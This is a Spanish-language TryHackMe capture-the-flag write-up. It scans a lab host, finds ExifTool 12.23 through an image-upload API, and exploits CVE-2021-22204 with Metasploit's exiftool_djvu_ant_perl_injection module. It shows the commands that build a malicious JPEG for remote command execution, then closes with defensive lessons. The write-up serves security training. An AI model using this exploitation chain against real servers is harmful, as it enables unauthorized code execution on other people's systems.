---
title: "TryHackMe: Deja Vu"
category: "TryHackMe"
order: 23
tags: ["tryhackme", "exiftool", "cve-2021-22204", "metasploit", "api-enumeration"]
layout: layouts/writeup.njk
permalink: /writeups/thm-deja-vu.html
---

## Reconocimiento

```bash
sudo nmap -Pn -n -v -p- --min-parallelism 64 --min-rate 20000 --min-hostgroup 64 --randomize-hosts -sS -sV 10.10.65.173
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```

## Explorando la webapp "Dog Pictures"

```bash
dirb http://10.10.65.173 /usr/share/wfuzz/wordlist/general/big.txt
...
==> DIRECTORY: http://10.10.65.173/upload/
```

Subiendo una imagen a `/upload/` e interceptando el tráfico con Burp Suite, el site map revela dos rutas de API usadas por la aplicación:

- **Título/caption:** `/dog/getmetadata`
- **Metadatos EXIF:** `/dog/getexifdata/`

En la respuesta JSON de `getexifdata`, el atributo **`ExifToolVersion`** revela la versión de ExifTool en uso: **12.23**.

## Identificando la vulnerabilidad

Esa versión de ExifTool es vulnerable a **CVE-2021-22204**, un RCE vía inyección de código Perl en el parseo de metadatos DjVu/ANT. El parche (versión 12.24) reforzó el filtro de escape de caracteres especiales usado antes de un `eval` sobre datos controlados por el atacante (el campo `Image Description`).

## Explotación con Metasploit

```bash
msf6 > search exiftool
0  exploit/unix/fileformat/exiftool_djvu_ant_perl_injection  2021-05-24  excellent  No

msf6 > use 0
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set lhost <tun0_ip>
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > exploit

[+] msf.jpg stored at /home/kali/.msf4/local/msf.jpg
```

Se genera una imagen JPEG maliciosa (`msf.jpg`) con el payload embebido en los metadatos. Al subirla a través de `/upload/`, el backend procesa la imagen con ExifTool, disparando el `eval` malicioso y entregando ejecución de comandos en el servidor.

## Lecciones aprendidas

- Herramientas de procesamiento de metadatos (ExifTool, ImageMagick, etc.) invocadas del lado del servidor sobre archivos subidos por usuarios son una superficie de ataque frecuentemente pasada por alto — vale la pena identificar su versión exacta vía las respuestas de la API, como en este caso.
- Los parches de seguridad publicados (el diff de CVE-2021-22204) son una fuente valiosa para entender la causa raíz de una vulnerabilidad, incluso cuando se termina usando un módulo de Metasploit ya armado.
- Enumerar rutas de API "ocultas" a través del site map de Burp Suite (tras generar tráfico real con la funcionalidad de la app) es más efectivo que un fuzzing ciego cuando la app es una SPA/API-driven.
